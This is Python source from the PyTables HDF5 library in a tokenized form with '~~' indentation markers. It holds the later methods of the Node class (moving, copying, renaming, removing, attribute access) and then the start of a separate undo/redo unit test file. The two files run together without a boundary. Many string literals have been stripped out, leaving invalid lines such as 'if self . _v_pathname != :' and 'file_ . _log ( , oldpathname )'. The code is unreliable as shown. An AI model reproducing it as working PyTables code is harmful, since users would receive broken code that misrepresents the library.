~~~ """Code to be called before killing the node.""" \n 
pass \n 
\n 
\n 
~~ def _g_create ( self ) : \n 
~~~ """Create a new HDF5 node and return its object identifier.""" \n 
raise NotImplementedError \n 
\n 
~~ def _g_open ( self ) : \n 
~~~ """Open an existing HDF5 node and return its object identifier.""" \n 
raise NotImplementedError \n 
\n 
~~ def _g_check_open ( self ) : \n 
~~~ """Check that the node is open.\n\n        If the node is closed, a `ClosedNodeError` is raised.\n\n        """ \n 
\n 
if not self . _v_isopen : \n 
~~~ raise ClosedNodeError ( "the node object is closed" ) \n 
~~ assert self . _v_file . isopen , "found an open node in a closed file" \n 
\n 
\n 
~~ def _g_set_location ( self , parentnode , name ) : \n 
~~~ """Set location-dependent attributes.\n\n        Sets the location-dependent attributes of this node to reflect\n        that it is placed under the specified `parentnode`, with the\n        specified `name`.\n\n        This also triggers the insertion of file references to this\n        node.  If the maximum recommended tree depth is exceeded, a\n        `PerformanceWarning` is issued.\n\n        """ \n 
\n 
file_ = parentnode . _v_file \n 
parentdepth = parentnode . _v_depth \n 
\n 
self . _v_file = file_ \n 
self . _v_isopen = True \n 
\n 
root_uep = file_ . root_uep \n 
if name . startswith ( root_uep ) : \n 
# This has been called from File._get_node() \n 
~~~ assert parentdepth == 0 \n 
if root_uep == "/" : \n 
~~~ self . _v_pathname = name \n 
~~ else : \n 
~~~ self . _v_pathname = name [ len ( root_uep ) : ] \n 
~~ _ , self . _v_name = split_path ( name ) \n 
self . _v_depth = name . count ( "/" ) - root_uep . count ( "/" ) + 1 \n 
~~ else : \n 
# If we enter here is because this has been called elsewhere \n 
~~~ self . _v_name = name \n 
self . _v_pathname = join_path ( parentnode . _v_pathname , name ) \n 
self . _v_depth = parentdepth + 1 \n 
\n 
# Check if the node is too deep in the tree. \n 
~~ if parentdepth >= self . _v_maxtreedepth : \n 
~~~ warnings . warn ( """\\\nnode ``%s`` is exceeding the recommended maximum depth (%d);\\\nbe ready to see PyTables asking for *lots* of memory and possibly slow I/O""" \n 
% ( self . _v_pathname , self . _v_maxtreedepth ) , \n 
PerformanceWarning ) \n 
\n 
~~ if self . _v_pathname != : \n 
~~~ file_ . _node_manager . cache_node ( self , self . _v_pathname ) \n 
\n 
\n 
~~ ~~ def _g_update_location ( self , newparentpath ) : \n 
~~~ """Update location-dependent attributes.\n\n        Updates location data when an ancestor node has changed its\n        location in the hierarchy to `newparentpath`.  In fact, this\n        method is expected to be called by an ancestor of this node.\n\n        This also triggers the update of file references to this node.\n        If the maximum recommended node depth is exceeded, a\n        `PerformanceWarning` is issued.  This warning is assured to be\n        unique.\n\n        """ \n 
\n 
oldpath = self . _v_pathname \n 
newpath = join_path ( newparentpath , self . _v_name ) \n 
newdepth = newpath . count ( ) \n 
\n 
self . _v_pathname = newpath \n 
self . _v_depth = newdepth \n 
\n 
# Check if the node is too deep in the tree. \n 
if newdepth > self . _v_maxtreedepth : \n 
~~~ warnings . warn ( """\\\nmoved descendent node is exceeding the recommended maximum depth (%d);\\\nbe ready to see PyTables asking for *lots* of memory and possibly slow I/O""" \n 
% ( self . _v_maxtreedepth , ) , PerformanceWarning ) \n 
\n 
~~ node_manager = self . _v_file . _node_manager \n 
node_manager . rename_node ( oldpath , newpath ) \n 
\n 
# Tell dependent objects about the new location of this node. \n 
self . _g_update_dependent ( ) \n 
\n 
\n 
~~ def _g_del_location ( self ) : \n 
~~~ """Clear location-dependent attributes.\n\n        This also triggers the removal of file references to this node.\n\n        """ \n 
\n 
node_manager = self . _v_file . _node_manager \n 
pathname = self . _v_pathname \n 
\n 
if not self . _v__deleting : \n 
~~~ node_manager . drop_from_cache ( pathname ) \n 
# Note: node_manager.drop_node do not removes the node form the \n 
# registry if it is still open \n 
node_manager . registry . pop ( pathname , None ) \n 
\n 
~~ self . _v_file = None \n 
self . _v_isopen = False \n 
self . _v_pathname = None \n 
self . _v_name = None \n 
self . _v_depth = None \n 
\n 
\n 
~~ def _g_post_init_hook ( self ) : \n 
~~~ """Code to be run after node creation and before creation logging.""" \n 
pass \n 
\n 
\n 
~~ def _g_update_dependent ( self ) : \n 
~~~ """Update dependent objects after a location change.\n\n        All dependent objects (but not nodes!) referencing this node\n        must be updated here.\n\n        """ \n 
\n 
if in self . __dict__ : \n 
~~~ self . _v_attrs . _g_update_node_location ( self ) \n 
\n 
\n 
~~ ~~ def _f_close ( self ) : \n 
~~~ """Close this node in the tree.\n\n        This releases all resources held by the node, so it should not\n        be used again.  On nodes with data, it may be flushed to disk.\n\n        You should not need to close nodes manually because they are\n        automatically opened/closed when they are loaded/evicted from\n        the integrated LRU cache.\n\n        """ \n 
\n 
# After calling ``_f_close()``, two conditions are met: \n 
# \n 
#   1. The node object is detached from the tree. \n 
#   2. *Every* attribute of the node is removed. \n 
# \n 
# Thus, cleanup operations used in ``_f_close()`` in sub-classes \n 
# must be run *before* calling the method in the superclass. \n 
\n 
if not self . _v_isopen : \n 
~~~ return # the node is already closed \n 
\n 
~~ myDict = self . __dict__ \n 
\n 
# Close the associated `AttributeSet` \n 
\n 
if in myDict : \n 
~~~ self . _v_attrs . _g_close ( ) \n 
\n 
# Detach the node from the tree if necessary. \n 
~~ self . _g_del_location ( ) \n 
\n 
# Finally, clear all remaining attributes from the object. \n 
myDict . clear ( ) \n 
\n 
# Just add a final flag to signal that the node is closed: \n 
self . _v_isopen = False \n 
\n 
~~ def _g_remove ( self , recursive , force ) : \n 
~~~ """Remove this node from the hierarchy.\n\n        If the node has children, recursive removal must be stated by\n        giving `recursive` a true value; otherwise, a `NodeError` will\n        be raised.\n\n        If `force` is set to true, the node will be removed no matter it\n        has children or not (useful for deleting hard links).\n\n        It does not log the change.\n\n        """ \n 
\n 
# Remove the node from the PyTables hierarchy. \n 
parent = self . _v_parent \n 
parent . _g_unrefnode ( self . _v_name ) \n 
# Close the node itself. \n 
self . _f_close ( ) \n 
# hdf5extension operations: \n 
# Remove the node from the HDF5 hierarchy. \n 
self . _g_delete ( parent ) \n 
\n 
~~ def _f_remove ( self , recursive = False , force = False ) : \n 
~~~ """Remove this node from the hierarchy.\n\n        If the node has children, recursive removal must be stated by giving\n        recursive a true value; otherwise, a NodeError will be raised.\n\n        If the node is a link to a Group object, and you are sure that you want\n        to delete it, you can do this by setting the force flag to true.\n\n        """ \n 
\n 
self . _g_check_open ( ) \n 
file_ = self . _v_file \n 
file_ . _check_writable ( ) \n 
\n 
if file_ . is_undo_enabled ( ) : \n 
~~~ self . _g_remove_and_log ( recursive , force ) \n 
~~ else : \n 
~~~ self . _g_remove ( recursive , force ) \n 
\n 
~~ ~~ def _g_remove_and_log ( self , recursive , force ) : \n 
~~~ file_ = self . _v_file \n 
oldpathname = self . _v_pathname \n 
# Log *before* moving to use the right shadow name. \n 
file_ . _log ( , oldpathname ) \n 
move_to_shadow ( file_ , oldpathname ) \n 
\n 
\n 
~~ def _g_move ( self , newparent , newname ) : \n 
~~~ """Move this node in the hierarchy.\n\n        Moves the node into the given `newparent`, with the given\n        `newname`.\n\n        It does not log the change.\n\n        """ \n 
\n 
oldparent = self . _v_parent \n 
oldname = self . _v_name \n 
oldpathname = self . _v_pathname # to move the HDF5 node \n 
\n 
# Try to insert the node into the new parent. \n 
newparent . _g_refnode ( self , newname ) \n 
# Remove the node from the new parent. \n 
oldparent . _g_unrefnode ( oldname ) \n 
\n 
# Remove location information for this node. \n 
self . _g_del_location ( ) \n 
# Set new location information for this node. \n 
self . _g_set_location ( newparent , newname ) \n 
\n 
# hdf5extension operations: \n 
#   Update node attributes. \n 
self . _g_new ( newparent , self . _v_name , init = False ) \n 
#   Move the node. \n 
# self._v_parent._g_move_node(oldpathname, self._v_pathname) \n 
self . _v_parent . _g_move_node ( oldparent . _v_objectid , oldname , \n 
newparent . _v_objectid , newname , \n 
oldpathname , self . _v_pathname ) \n 
\n 
# Tell dependent objects about the new location of this node. \n 
self . _g_update_dependent ( ) \n 
\n 
~~ def _f_rename ( self , newname , overwrite = False ) : \n 
~~~ """Rename this node in place.\n\n        Changes the name of a node to *newname* (a string).  If a node with the\n        same newname already exists and overwrite is true, recursively remove\n        it before renaming.\n\n        """ \n 
\n 
self . _f_move ( newname = newname , overwrite = overwrite ) \n 
\n 
~~ def _f_move ( self , newparent = None , newname = None , \n 
overwrite = False , createparents = False ) : \n 
~~~ """Move or rename this node.\n\n        Moves a node into a new parent group, or changes the name of the\n        node. newparent can be a Group object (see :ref:`GroupClassDescr`) or a\n        pathname in string form. If it is not specified or None, the current\n        parent group is chosen as the new parent.  newname must be a string\n        with a new name. If it is not specified or None, the current name is\n        chosen as the new name. If createparents is true, the needed groups for\n        the given new parent group path to exist will be created.\n\n        Moving a node across databases is not allowed, nor it is moving a node\n        *into* itself. These result in a NodeError. However, moving a node\n        *over* itself is allowed and simply does nothing. Moving over another\n        existing node is similarly not allowed, unless the optional overwrite\n        argument is true, in which case that node is recursively removed before\n        moving.\n\n        Usually, only the first argument will be used, effectively moving the\n        node to a new location without changing its name.  Using only the\n        second argument is equivalent to renaming the node in place.\n\n        """ \n 
\n 
self . _g_check_open ( ) \n 
file_ = self . _v_file \n 
oldparent = self . _v_parent \n 
oldname = self . _v_name \n 
\n 
# Set default arguments. \n 
if newparent is None and newname is None : \n 
~~~ raise NodeError ( "you should specify at least " \n 
"a ``newparent`` or a ``newname`` parameter" ) \n 
~~ if newparent is None : \n 
~~~ newparent = oldparent \n 
~~ if newname is None : \n 
~~~ newname = oldname \n 
\n 
# Get destination location. \n 
~~ if hasattr ( newparent , ) : # from node \n 
~~~ newfile = newparent . _v_file \n 
newpath = newparent . _v_pathname \n 
~~ elif hasattr ( newparent , ) : # from path \n 
~~~ newfile = file_ \n 
newpath = newparent \n 
~~ else : \n 
~~~ raise TypeError ( "new parent is not a node nor a path: %r" \n 
% ( newparent , ) ) \n 
\n 
# Validity checks on arguments. \n 
# Is it in the same file? \n 
~~ if newfile is not file_ : \n 
~~~ raise NodeError ( "nodes can not be moved across databases; " \n 
"please make a copy of the node" ) \n 
\n 
# The movement always fails if the hosting file can not be modified. \n 
~~ file_ . _check_writable ( ) \n 
\n 
# Moving over itself? \n 
oldpath = oldparent . _v_pathname \n 
if newpath == oldpath and newname == oldname : \n 
# This is equivalent to renaming the node to its current name, \n 
# and it does not change the referenced object, \n 
# so it is an allowed no-op. \n 
~~~ return \n 
\n 
# Moving into itself? \n 
~~ self . _g_check_not_contains ( newpath ) \n 
\n 
# Note that the previous checks allow us to go ahead and create \n 
# the parent groups if `createparents` is true.  `newparent` is \n 
# used instead of `newpath` to avoid accepting `Node` objects \n 
# when `createparents` is true. \n 
newparent = file_ . _get_or_create_path ( newparent , createparents ) \n 
self . _g_check_group ( newparent ) # Is it a group? \n 
\n 
# Moving over an existing node? \n 
self . _g_maybe_remove ( newparent , newname , overwrite ) \n 
\n 
# Move the node. \n 
oldpathname = self . _v_pathname \n 
self . _g_move ( newparent , newname ) \n 
\n 
# Log the change. \n 
if file_ . is_undo_enabled ( ) : \n 
~~~ self . _g_log_move ( oldpathname ) \n 
\n 
~~ ~~ def _g_log_move ( self , oldpathname ) : \n 
~~~ self . _v_file . _log ( , oldpathname , self . _v_pathname ) \n 
\n 
\n 
~~ def _g_copy ( self , newparent , newname , recursive , _log = True , ** kwargs ) : \n 
~~~ """Copy this node and return the new one.\n\n        Creates and returns a copy of the node in the given `newparent`,\n        with the given `newname`.  If `recursive` copy is stated, all\n        descendents are copied as well.  Additional keyword argumens may\n        affect the way that the copy is made.  Unknown arguments must be\n        ignored.  On recursive copies, all keyword arguments must be\n        passed on to the children invocation of this method.\n\n        If `_log` is false, the change is not logged.  This is *only*\n        intended to be used by ``_g_copy_as_child()`` as a means of\n        optimising sub-tree copies.\n\n        """ \n 
\n 
raise NotImplementedError \n 
\n 
~~ def _g_copy_as_child ( self , newparent , ** kwargs ) : \n 
~~~ """Copy this node as a child of another group.\n\n        Copies just this node into `newparent`, not recursing children\n        nor overwriting nodes nor logging the copy.  This is intended to\n        be used when copying whole sub-trees.\n\n        """ \n 
\n 
return self . _g_copy ( newparent , self . _v_name , \n 
recursive = False , _log = False , ** kwargs ) \n 
\n 
\n 
~~ def _f_copy ( self , newparent = None , newname = None , \n 
overwrite = False , recursive = False , createparents = False , \n 
** kwargs ) : \n 
~~~ """Copy this node and return the new node.\n\n        Creates and returns a copy of the node, maybe in a different place in\n        the hierarchy. newparent can be a Group object (see\n        :ref:`GroupClassDescr`) or a pathname in string form. If it is not\n        specified or None, the current parent group is chosen as the new\n        parent.  newname must be a string with a new name. If it is not\n        specified or None, the current name is chosen as the new name. If\n        recursive copy is stated, all descendants are copied as well. If\n        createparents is true, the needed groups for the given new parent group\n        path to exist will be created.\n\n        Copying a node across databases is supported but can not be\n        undone. Copying a node over itself is not allowed, nor it is\n        recursively copying a node into itself. These result in a\n        NodeError. Copying over another existing node is similarly not allowed,\n        unless the optional overwrite argument is true, in which case that node\n        is recursively removed before copying.\n\n        Additional keyword arguments may be passed to customize the copying\n        process. For instance, title and filters may be changed, user\n        attributes may be or may not be copied, data may be sub-sampled, stats\n        may be collected, etc. See the documentation for the particular node\n        type.\n\n        Using only the first argument is equivalent to copying the node to a\n        new location without changing its name. Using only the second argument\n        is equivalent to making a copy of the node in the same group.\n\n        """ \n 
\n 
self . _g_check_open ( ) \n 
srcfile = self . _v_file \n 
srcparent = self . _v_parent \n 
srcname = self . _v_name \n 
\n 
dstparent = newparent \n 
dstname = newname \n 
\n 
# Set default arguments. \n 
if dstparent is None and dstname is None : \n 
~~~ raise NodeError ( "you should specify at least " \n 
"a ``newparent`` or a ``newname`` parameter" ) \n 
~~ if dstparent is None : \n 
~~~ dstparent = srcparent \n 
~~ if dstname is None : \n 
~~~ dstname = srcname \n 
\n 
# Get destination location. \n 
~~ if hasattr ( dstparent , ) : # from node \n 
~~~ dstfile = dstparent . _v_file \n 
dstpath = dstparent . _v_pathname \n 
~~ elif hasattr ( dstparent , ) : # from path \n 
~~~ dstfile = srcfile \n 
dstpath = dstparent \n 
~~ else : \n 
~~~ raise TypeError ( "new parent is not a node nor a path: %r" \n 
% ( dstparent , ) ) \n 
\n 
# Validity checks on arguments. \n 
~~ if dstfile is srcfile : \n 
# Copying over itself? \n 
~~~ srcpath = srcparent . _v_pathname \n 
if dstpath == srcpath and dstname == srcname : \n 
~~~ raise NodeError ( \n 
"source and destination nodes are the same node: ``%s``" \n 
% self . _v_pathname ) \n 
\n 
# Recursively copying into itself? \n 
~~ if recursive : \n 
~~~ self . _g_check_not_contains ( dstpath ) \n 
\n 
# Note that the previous checks allow us to go ahead and create \n 
# the parent groups if `createparents` is true.  `dstParent` is \n 
# used instead of `dstPath` because it may be in other file, and \n 
# to avoid accepting `Node` objects when `createparents` is \n 
# true. \n 
~~ ~~ dstparent = srcfile . _get_or_create_path ( dstparent , createparents ) \n 
self . _g_check_group ( dstparent ) # Is it a group? \n 
\n 
# Copying to another file with undo enabled? \n 
if dstfile is not srcfile and srcfile . is_undo_enabled ( ) : \n 
~~~ warnings . warn ( "copying across databases can not be undone " \n 
"nor redone from this database" , \n 
UndoRedoWarning ) \n 
\n 
# Copying over an existing node? \n 
~~ self . _g_maybe_remove ( dstparent , dstname , overwrite ) \n 
\n 
# Copy the node. \n 
# The constructor of the new node takes care of logging. \n 
return self . _g_copy ( dstparent , dstname , recursive , ** kwargs ) \n 
\n 
~~ def _f_isvisible ( self ) : \n 
~~~ """Is this node visible?""" \n 
\n 
self . _g_check_open ( ) \n 
return isvisiblepath ( self . _v_pathname ) \n 
\n 
\n 
~~ def _g_check_group ( self , node ) : \n 
# Node must be defined in order to define a Group. \n 
# However, we need to know Group here. \n 
# Using class_name_dict avoids a circular import. \n 
~~~ if not isinstance ( node , class_name_dict [ ] ) : \n 
~~~ raise TypeError ( "new parent is not a registered node: %s" \n 
% node . _v_pathname ) \n 
~~ if not isinstance ( node , class_name_dict [ ] ) : \n 
~~~ raise TypeError ( "new parent node ``%s`` is not a group" \n 
% node . _v_pathname ) \n 
\n 
\n 
~~ ~~ def _g_check_not_contains ( self , pathname ) : \n 
# The not-a-TARDIS test. ;) \n 
~~~ mypathname = self . _v_pathname \n 
if ( mypathname == # all nodes fall below the root group \n 
or pathname == mypathname \n 
or pathname . startswith ( mypathname + ) ) : \n 
~~~ raise NodeError ( "can not move or recursively copy node ``%s`` " \n 
"into itself" % mypathname ) \n 
\n 
\n 
~~ ~~ def _g_maybe_remove ( self , parent , name , overwrite ) : \n 
~~~ if name in parent : \n 
~~~ if not overwrite : \n 
~~~ raise NodeError ( """\\\ndestination group ``%s`` already has a node named ``%s``; \\\nyou may want to use the ``overwrite`` argument""" % ( parent . _v_pathname , name ) ) \n 
~~ parent . _f_get_child ( name ) . _f_remove ( True ) \n 
\n 
\n 
~~ ~~ def _g_check_name ( self , name ) : \n 
~~~ """Check validity of name for this particular kind of node.\n\n        This is invoked once the standard HDF5 and natural naming checks\n        have successfully passed.\n\n        """ \n 
\n 
if name . startswith ( ) : \n 
# This is reserved for table index groups. \n 
~~~ raise ValueError ( \n 
"node name starts with reserved prefix ``_i_``: %s" % name ) \n 
\n 
\n 
# <attribute handling> \n 
~~ ~~ def _f_getattr ( self , name ) : \n 
~~~ """Get a PyTables attribute from this node.\n\n        If the named attribute does not exist, an AttributeError is\n        raised.\n\n        """ \n 
\n 
return getattr ( self . _v_attrs , name ) \n 
\n 
\n 
~~ def _f_setattr ( self , name , value ) : \n 
~~~ """Set a PyTables attribute for this node.\n\n        If the node already has a large number of attributes, a\n        PerformanceWarning is issued.\n\n        """ \n 
\n 
setattr ( self . _v_attrs , name , value ) \n 
\n 
\n 
~~ def _f_delattr ( self , name ) : \n 
~~~ """Delete a PyTables attribute from this node.\n\n        If the named attribute does not exist, an AttributeError is\n        raised.\n\n        """ \n 
\n 
delattr ( self . _v_attrs , name ) \n 
\n 
\n 
# </attribute handling> \n 
\n 
\n 
~~ ~~ class NotLoggedMixin : \n 
# Include this class in your inheritance tree \n 
# to avoid changes to instances of your class from being logged. \n 
\n 
~~~ _AttributeSet = NotLoggedAttributeSet \n 
\n 
def _g_log_create ( self ) : \n 
~~~ pass \n 
\n 
\n 
~~ def _g_log_move ( self , oldpathname ) : \n 
~~~ pass \n 
\n 
\n 
~~ def _g_remove_and_log ( self , recursive , force ) : \n 
~~~ self . _g_remove ( recursive , force ) \n 
\n 
\n 
\n 
## Local Variables: \n 
## mode: python \n 
## py-indent-offset: 4 \n 
## tab-width: 4 \n 
## fill-column: 72 \n 
## End: \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ ~~ from __future__ import print_function \n 
from __future__ import absolute_import \n 
import warnings \n 
\n 
import tables \n 
from tables import IsDescription , StringCol , BoolCol , IntCol , FloatCol \n 
from tables . node import NotLoggedMixin \n 
from tables . path import join_path \n 
\n 
from tables . tests import common \n 
from tables . tests . common import unittest \n 
from tables . tests . common import PyTablesTestCase as TestCase \n 
from six . moves import range \n 
\n 
\n 
class BasicTestCase ( common . TempFileMixin , TestCase ) : \n 
~~~ """Test for basic Undo/Redo operations.""" \n 
\n 
_reopen_flag = False \n 
"""Whether to reopen the file at certain points.""" \n 
\n 
def _do_reopen ( self ) : \n 
~~~ if self . _reopen_flag : \n 
~~~ self . _reopen ( ) \n 
\n 
~~ ~~ def setUp ( self ) : \n 
~~~ super ( BasicTestCase , self ) . setUp ( ) \n 
\n 
h5file = self . h5file \n 
root = h5file . root \n 
\n 
# Create an array \n 
h5file . create_array ( root , , [ 1 , 2 ] , title = "Title example" ) \n 
\n 
# Create another array object \n 
h5file . create_array ( root , , [ 1 ] , "Array title" ) \n 
\n 
# Create a group object \n 
group = h5file . create_group ( root , , "Group title" ) \n 
\n 
# Create a couple of objects there \n 
h5file . create_array ( group , , [ 2 ] , "Array title 1" ) \n 
h5file . create_array ( group , , [ 2 ] , "Array title 2" ) \n 
\n 
# Create a lonely group in first level \n 
h5file . create_group ( root , , "Group title 2" ) \n 
\n 
# Create a new group in the second level \n 
h5file . create_group ( group , , "Group title 3" ) \n 
\n 
~~ def test00_simple ( self ) : \n 
~~~ """Checking simple do/undo.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test00_simple..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
\n 
# Now undo the past operation \n 
self . h5file . undo ( ) \n 
\n 
# Check that otherarray does not exist in the object tree \n 
self . assertTrue ( "/otherarray" not in self . h5file ) \n 
self . assertEqual ( self . h5file . _curaction , 0 ) \n 
self . assertEqual ( self . h5file . _curmark , 0 ) \n 
\n 
# Redo the operation \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( ) \n 
if common . verbose : \n 
~~~ print ( "Object tree after redo:" , self . h5file ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
~~ self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray . title , "Another array" ) \n 
self . assertEqual ( self . h5file . _curaction , 1 ) \n 
self . assertEqual ( self . h5file . _curmark , 0 ) \n 
\n 
~~ def test01_twice ( self ) : \n 
~~~ """Checking do/undo (twice operations intertwined)""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test01_twice..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Now undo the past operations \n 
self . _do_reopen ( ) \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertEqual ( self . h5file . _curaction , 0 ) \n 
self . assertEqual ( self . h5file . _curmark , 0 ) \n 
\n 
# Redo the operation \n 
self . h5file . redo ( ) \n 
\n 
# Check that otherarray has come back to life in a sane state \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray . title , "Another array" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . _curaction , 2 ) \n 
self . assertEqual ( self . h5file . _curmark , 0 ) \n 
\n 
~~ def test02_twice2 ( self ) : \n 
~~~ """Checking twice ops and two marks.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test02_twice2..." % self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array" ) \n 
\n 
# Put a mark \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
self . assertEqual ( self . h5file . _curaction , 3 ) \n 
self . assertEqual ( self . h5file . _curmark , 1 ) \n 
\n 
# Unwind just one mark \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertEqual ( self . h5file . _curaction , 2 ) \n 
self . assertEqual ( self . h5file . _curmark , 1 ) \n 
\n 
# Unwind another mark \n 
self . h5file . undo ( ) \n 
self . assertEqual ( self . h5file . _curaction , 0 ) \n 
self . assertEqual ( self . h5file . _curmark , 0 ) \n 
self . assertTrue ( "/otherarray" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
\n 
# Redo until the next mark \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . _do_reopen ( ) \n 
self . assertEqual ( self . h5file . _curaction , 2 ) \n 
self . assertEqual ( self . h5file . _curmark , 1 ) \n 
\n 
# Redo until the end \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray . title , "Another array" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . _curaction , 3 ) \n 
self . assertEqual ( self . h5file . _curmark , 1 ) \n 
\n 
~~ def test03_6times3marks ( self ) : \n 
~~~ """Checking with six ops and three marks.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test03_6times3marks..." % \n 
self . __class__ . __name__ ) \n 
\n 
# open the do/undo \n 
~~ self . h5file . enable_undo ( ) \n 
\n 
# Create a new array \n 
self . h5file . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
self . h5file . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
\n 
# Put a mark \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
self . h5file . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
\n 
# Put a mark \n 
self . _do_reopen ( ) \n 
self . h5file . mark ( ) \n 
self . h5file . create_array ( , , [ 7 , 8 ] , "Another array 5" ) \n 
self . h5file . create_array ( , , [ 8 , 9 ] , "Another array 6" ) \n 
\n 
# Unwind just one mark \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Unwind another mark \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Unwind all marks \n 
self . h5file . undo ( ) \n 
self . assertTrue ( "/otherarray1" not in self . h5file ) \n 
self . assertTrue ( "/otherarray2" not in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Redo until the next mark \n 
self . _do_reopen ( ) \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" not in self . h5file ) \n 
self . assertTrue ( "/otherarray4" not in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Redo until the next mark \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
self . assertTrue ( "/otherarray5" not in self . h5file ) \n 
self . assertTrue ( "/otherarray6" not in self . h5file ) \n 
\n 
# Redo until the end \n 
self . h5file . redo ( ) \n 
self . assertTrue ( "/otherarray1" in self . h5file ) \n 
self . assertTrue ( "/otherarray2" in self . h5file ) \n 
self . assertTrue ( "/otherarray3" in self . h5file ) \n 
self . assertTrue ( "/otherarray4" in self . h5file ) \n 
self . assertTrue ( "/otherarray5" in self . h5file ) \n 
self . assertTrue ( "/otherarray6" in self . h5file ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . read ( ) , [ 3 , 4 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . read ( ) , [ 4 , 5 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . read ( ) , [ 5 , 6 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray4 . read ( ) , [ 6 , 7 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray5 . read ( ) , [ 7 , 8 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray6 . read ( ) , [ 8 , 9 ] ) \n 
self . assertEqual ( self . h5file . root . otherarray1 . title , "Another array 1" ) \n 
self . assertEqual ( self . h5file . root . otherarray2 . title , "Another array 2" ) \n 
self . assertEqual ( self . h5file . root . otherarray3 . title , "Another array 3" ) \n 
self . assertEqual ( self . h5file . root . otherarray4 . title , "Another array 4" ) \n 
self . assertEqual ( self . h5file . root . otherarray5 . title , "Another array 5" ) \n 
self . assertEqual ( self . h5file . root . otherarray6 . title , "Another array 6" ) \n 
\n 
~~ def test04_6times3marksro ( self ) : \n 
~~~ """Checking with six operations, three marks and do/undo in random\n        order.""" \n 
\n 
if common . verbose : \n 
~~~ print ( , * 30 ) \n 
print ( "Running %s.test04_6times3marksro..." % \n 
self . __class__ . __name__ ) \n 
\n 
